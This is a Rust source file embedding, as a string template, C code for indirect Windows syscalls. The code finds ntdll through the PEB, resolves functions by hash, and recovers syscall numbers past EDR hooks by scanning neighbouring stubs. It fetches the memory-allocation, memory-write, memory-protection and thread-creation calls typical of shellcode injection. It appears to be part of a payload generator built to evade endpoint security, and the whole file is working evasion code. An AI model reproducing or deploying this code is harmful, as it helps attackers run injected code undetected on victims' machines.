pub const INDIRECTSYSCALL_C: &str = r#"
#include "../include/Globals.h"
#include "../include/IndirectSyscall.h"
#include <stdio.h>
#include <windows.h>

/*
 * Function:  HashStringJenkinsOneAtATime32BitA
 * --------------------
 *  Hash a string using the Jenkins one at a time hash algorithm
 *
 *  String: string to hash
 *  returns: hash value
 *
 */

UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
        SIZE_T Index = 0;
        UINT32 Hash = 0;
        SIZE_T Length = lstrlenA(String);

        while (Index != Length)
        {
                Hash += String[Index++];
                Hash += Hash << INITIAL_SEED;
                Hash ^= Hash >> 6;
        }

        Hash += Hash << 3;
        Hash ^= Hash >> 11;
        Hash += Hash << 15;

        return Hash;
}
/*
 * Function:  InitNtdllConfig
 * --------------------
 *  Initialize the NTDLL_CONFIG structure
 *
 *  pNtCofnig: pointer to NTDLL_CONFIG structure
 *  returns: NTDLL_INIT_STATUS
 *
 */
NTDLL_INIT_STATUS InitNtdllConfig(OUT PNTDLL_CONFIG pNtCofnig)
{
        // get the peb
        PPEB pPeb = (PPEB)__readgsqword(0x60);
        if (!pPeb || pPeb->OSMajorVersion != 0xA)
                return NTDLL_INIT_STATUS_FAILED;

        // get the ntdll.dll module
        PLDR_DATA_TABLE_ENTRY pLdr =
            (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
        if (!pLdr)
                return NTDLL_INIT_STATUS_FAILED;

        // get the ntdll.dll base address
        ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
        if (!uModule)
                return NTDLL_INIT_STATUS_FAILED;

        // DOS HEADER
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uModule;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
                return NTDLL_INIT_STATUS_FAILED;

        // NT HEADER
        PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(uModule + pDosHeader->e_lfanew);
        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
                return NTDLL_INIT_STATUS_FAILED;

        // EXPORT DIRECTORY
        PIMAGE_EXPORT_DIRECTORY pExportDirectory =
            (PIMAGE_EXPORT_DIRECTORY)(uModule + pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                                    .VirtualAddress);

        if (!pExportDirectory)
                return NTDLL_INIT_STATUS_FAILED;

        // init the ntdll config
        pNtCofnig->dwNumberOfNames = pExportDirectory->NumberOfNames;
        pNtCofnig->pdwArrayOfAddresses = (PDWORD)(uModule + pExportDirectory->AddressOfFunctions);
        pNtCofnig->pdwArrayOfNames = (PDWORD)(uModule + pExportDirectory->AddressOfNames);
        pNtCofnig->pwArrayOfOrdinals = (PWORD)(uModule + pExportDirectory->AddressOfNameOrdinals);
        pNtCofnig->uModule = uModule;

        if (!pNtCofnig->pdwArrayOfAddresses || !pNtCofnig->pdwArrayOfNames || !pNtCofnig->pwArrayOfOrdinals)
                return NTDLL_INIT_STATUS_FAILED;

        return NTDLL_INIT_STATUS_SUCCESS;
}

/*
 * Function:  FetchNtSyscall
 * --------------------
 *  Fetch the syscall address from ntdll.dll
 *  using the hash of the syscall name
 *  and fill the NT_SYSCALL structure
 *
 *  pNtConfig: pointer to NTDLL_CONFIG structure
 *  dwSysHash: hash of the syscall name
 *  pNtSys: pointer to NT_SYSCALL structure
 *
 */
FETCH_STATUS FetchNtSyscall(IN PNTDLL_CONFIG pNtConfig, IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys)
{
        // check if the ntdll config is initialized
        if (!pNtConfig || !pNtConfig->pdwArrayOfAddresses || !pNtConfig->pdwArrayOfNames ||
            !pNtConfig->pwArrayOfOrdinals)
        {
                // PrintError("Invalid parameter");

                return FETCH_STATUS_INVALID_PARAMETER;
        }

        // check if the syscall name hash is valid
        if (dwSysHash != 0)
                pNtSys->dwSyscallHash = dwSysHash;
        else
                return FETCH_STATUS_INVALID_PARAMETER;

        for (size_t i = 0; i < pNtConfig->dwNumberOfNames; i++)
        {
                // get the syscall name
                PCHAR pFunctionName = (PCHAR)(pNtConfig->uModule + pNtConfig->pdwArrayOfNames[i]);

                // get the syscall address
                PVOID pFunctionAddress =
                    (PVOID)(pNtConfig->uModule + pNtConfig->pdwArrayOfAddresses[pNtConfig->pwArrayOfOrdinals[i]]);

                // is callback function, we just need FunctionAddress
                if (dwSysHash == TpAllocWork_Hash || dwSysHash == TpPostWork_Hash || dwSysHash == TpReleaseWork_Hash)
                {

                        if (HASH(pFunctionName) == dwSysHash)
                        {

                                pNtSys->pSyscallAddress = pFunctionAddress;
                                printf("[*] Found Callback Function: %s\n", pFunctionName);
                                printf("[*] Callback Function Address: %p\n", pFunctionAddress);
                                return FETCH_STATUS_SUCCESS;
                        }
                }
                // if the syscall name hash matches the hash of the current syscall name
                if (HASH(pFunctionName) == dwSysHash)
                {

                        pNtSys->pSyscallAddress = pFunctionAddress;
                        // if syscall not hooked
                        if (*((PBYTE)pFunctionAddress) == 0x4C && *((PBYTE)pFunctionAddress + 1) == 0x8B &&
                            *((PBYTE)pFunctionAddress + 2) == 0xD1 && *((PBYTE)pFunctionAddress + 3) == 0xB8 &&
                            *((PBYTE)pFunctionAddress + 6) == 0x00 && *((PBYTE)pFunctionAddress + 7) == 0x00)
                        {

                                BYTE high = *((PBYTE)pFunctionAddress + 5);
                                BYTE low = *((PBYTE)pFunctionAddress + 4);
                                pNtSys->dwSSn = (high << 8) | low;
                                break;
                        }

                        // if hooked - exmpale 1
                        if (*((PBYTE)pFunctionAddress) == 0xE9)
                        {

                                for (WORD idx = 1; idx <= RANGE; idx++)
                                {
                                        // check neighboring syscall down
                                        if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4C &&
                                            *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8B &&
                                            *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xD1 &&
                                            *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xB8 &&
                                            *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00 &&
                                            *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00)
                                        {

                                                BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
                                                BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
                                                pNtSys->dwSSn = (high << 8) | low - idx;
                                                break; // break for-loop [idx]
                                        }
                                        // check neighboring syscall up
                                        if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4C &&
                                            *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8B &&
                                            *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xD1 &&
                                            *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xB8 &&
                                            *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00 &&
                                            *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00)
                                        {

                                                BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
                                                BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
                                                pNtSys->dwSSn = (high << 8) | low + idx;
                                                break; // break for-loop [idx]
                                        }
                                }
                        }

                        // if hooked - exmpale 2
                        if (*((PBYTE)pFunctionAddress + 3) == 0xE9)
                        {

                                for (WORD idx = 1; idx <= RANGE; idx++)
                                {
                                        // check neighboring syscall down
                                        if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4C &&
                                            *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8B &&
                                            *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xD1 &&
                                            *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xB8 &&
                                            *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00 &&
                                            *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00)
                                        {

                                                BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
                                                BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
                                                pNtSys->dwSSn = (high << 8) | low - idx;
                                                break; // break for-loop [idx]
                                        }
                                        // check neighboring syscall up
                                        if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4C &&
                                            *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8B &&
                                            *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xD1 &&
                                            *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xB8 &&
                                            *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00 &&
                                            *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00)
                                        {

                                                BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
                                                BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
                                                pNtSys->dwSSn = (high << 8) | low + idx;
                                                break; // break for-loop [idx]
                                        }
                                }
                        }

                        break;
                }
        }

        if (!pNtSys->pSyscallAddress)
                return FETCH_STATUS_FAILED;
        ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

        for (DWORD z = 0, x = 1; z <= RANGE; z++, x++)
        {
                if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05)
                {
                        pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
                        break; // break for-loop [x & z]
                }
        }
        // PrintInfo("Syscall Instruction Address: %p", pNtSys->pSyscallInstAddress);
        // PrintInfo("Syscall Address: %p", pNtSys->pSyscallAddress);
        // PrintInfo("Syscall SSN: 0x%0.2X", pNtSys->dwSSn);
        // PrintInfo("Syscall Hash: 0x%0.2X", pNtSys->dwSyscallHash);

        // check all
        if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL &&
            pNtSys->pSyscallInstAddress != NULL)

                return FETCH_STATUS_SUCCESS;
        else
                return FETCH_STATUS_FAILED;
}

/*
 * Function:  InitSyscall
 * --------------------
 *  Initialize the NTAPI_FUNC structure
 *  and fetch the syscall addresses
 *  using the hash of the syscall name
 *  and fill the NT_SYSCALL structure
 *
 *  pNtApiFunc: pointer to NTAPI_FUNC structure
 *  pNtConfig: pointer to NTDLL_CONFIG structure
 *
 */
NTSYSCALL_INIT_STATUS InitSyscall(OUT PNTAPI_FUNC pNtApiFunc, IN PNTDLL_CONFIG pNtConfig)
{

        if (FetchNtSyscall(pNtConfig, NtAllocateVirtualMemory_Hash, &pNtApiFunc->NtAllocateVirtualMemory) !=
            FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch NtAllocateVirtualMemory\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("NtAllocateVirtualMemory fetched successfully\n\t\\_SSN: 0x%0.2X \n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->NtAllocateVirtualMemory.dwSSn,
        //              pNtApiFunc->NtAllocateVirtualMemory.pSyscallInstAddress);

        if (FetchNtSyscall(pNtConfig, NtCreateThreadEx_Hash, &pNtApiFunc->NtCreateThreadEx) != FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch NtFreeVirtualMemory\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("NtCreateThreadEx fetched successfully\n\t\\_SSN: 0x%0.2X \n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->NtCreateThreadEx.dwSSn, pNtApiFunc->NtCreateThreadEx.pSyscallInstAddress);

        if (FetchNtSyscall(pNtConfig, NtProtectVirtualMemory_Hash, &pNtApiFunc->NtProtectVirtualMemory) !=
            FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch NtProtectVirtualMemory\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("NtProtectVirtualMemory fetched successfully\n\t\\_SSN: 0x%0.2X \n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->NtProtectVirtualMemory.dwSSn, pNtApiFunc->NtProtectVirtualMemory.pSyscallInstAddress);

        if (FetchNtSyscall(pNtConfig, NtWaitForSingleObject_Hash, &pNtApiFunc->NtWaitForSingleObject) !=
            FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch NtWaitForSingleObject\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("NtWaitForSingleObject fetched successfully\n\t\\_SSN: 0x%0.2X \n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->NtWaitForSingleObject.dwSSn, pNtApiFunc->NtWaitForSingleObject.pSyscallInstAddress);

        if (FetchNtSyscall(pNtConfig, NtWriteVirtualMemory_Hash, &pNtApiFunc->NtWriteVirtualMemory) !=
            FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch NtWriteVirtualMemory\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("NtWriteVirtualMemory fetched successfully\n\t\\_SSN: 0x%0.2X \n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->NtWriteVirtualMemory.dwSSn, pNtApiFunc->NtWriteVirtualMemory.pSyscallInstAddress);

        // NT_SYSCALL TpAllocWork;
        // NT_SYSCALL TpPostWork;
        // NT_SYSCALL TpReleaseWork;
        if (FetchNtSyscall(pNtConfig, TpAllocWork_Hash, &pNtApiFunc->TpAllocWork) != FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch TpAllocWork\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("TpAllocWork fetched successfully\n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->TpAllocWork.pSyscallAddress);

        if (FetchNtSyscall(pNtConfig, TpPostWork_Hash, &pNtApiFunc->TpPostWork) != FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch TpPostWork\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("TpPostWork fetched successfully\n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->TpPostWork.pSyscallAddress);

        if (FetchNtSyscall(pNtConfig, TpReleaseWork_Hash, &pNtApiFunc->TpReleaseWork) != FETCH_STATUS_SUCCESS)
        {
                // PrintError("Failed to fetch TpReleaseWork\n");
                return NTSYSCALL_INIT_STATUS_FAILED;
        }
        // PrintSuccess("TpReleaseWork fetched successfully\n\t\\_Instruction Address: %p\n",
        //              pNtApiFunc->TpReleaseWork.pSyscallAddress);

        return NTSYSCALL_INIT_STATUS_SUCCESS;
}
"#;
